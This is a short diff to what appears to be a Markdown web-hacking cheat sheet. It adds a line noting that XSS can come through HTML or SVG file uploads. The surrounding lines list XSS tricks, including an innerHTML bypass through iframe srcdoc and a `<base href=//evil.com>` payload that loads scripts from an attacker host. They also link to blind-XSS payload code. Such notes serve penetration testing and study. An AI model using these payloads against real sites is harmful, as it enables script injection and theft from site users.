@@ -340,6 +340,7 @@ var_dump(explode(',',ini_get('suhosin.executor.func.blacklist')));
 - To pop XSS in `innerHTML` first load the script into `iframe srcdoc` then load that `iframe` into the `innerHTML`.
 - If there is any encoded entities `&lt;` and `&gt;` see if there are any `unescape` calls you can pass them through.
 - `<base href=//evil.com>` allows you to change all relative URLs. For example `<script src=/xss.js>` will use `evil.com` to retrieve `xss.js`.
+- XSS can also be done through file-uploads in case HTML or SVG files are allowed to be uploaded.
 - Blind XSS:
     - Read `https://brutelogic.com.br/blog/blind-xss-code/` get the code here `http://brutelogic.com.br/brutal/blind/index.txt`.
     - Use `http://xss.rocks/xss.js` for including an `alert()` js file.
